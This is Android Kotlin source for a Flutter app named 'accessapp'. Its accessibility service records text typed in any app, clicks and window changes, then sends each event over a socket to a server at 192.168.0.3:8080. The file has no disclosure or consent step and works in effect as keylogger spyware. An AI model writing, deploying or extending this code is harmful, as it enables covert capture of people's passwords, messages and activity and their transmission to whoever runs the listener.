package com.accessapp

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.io.BufferedWriter
import java.io.OutputStreamWriter
import java.net.Socket
import kotlin.concurrent.thread

class MainActivity: FlutterActivity() {
    private val CHANNEL = "com.accessapp/accessibility"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "isAccessibilityEnabled" -> result.success(isAccessibilityServiceEnabled())
                "openAccessibilitySettings" -> {
                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                    result.success(null)
                }
                else -> result.notImplemented()
            }
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val services = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return services.contains("${packageName}/${AccessibilityMonitorService::class.java.name}")
    }
}

class AccessibilityMonitorService : AccessibilityService() {
    companion object {
        private const val TAG = "AccessMonitor"
        private const val SERVER_HOST = "192.168.0.3"
        private const val SERVER_PORT = 8080
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val message = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "Text: ${event.text.joinToString()}"
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "Clicked"
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> "Window: ${event.packageName}"
            else -> "Event: ${event.eventType}"
        }
        Log.d(TAG, message)
        sendToServer(message)
    }

    private fun sendToServer(data: String) {
        thread {
            try {
                Socket(SERVER_HOST, SERVER_PORT).use { socket ->
                    BufferedWriter(OutputStreamWriter(socket.getOutputStream())).use { writer ->
                        writer.write("$data\n")
                        writer.flush()
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error: ${e.message}")
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted")
    }
}
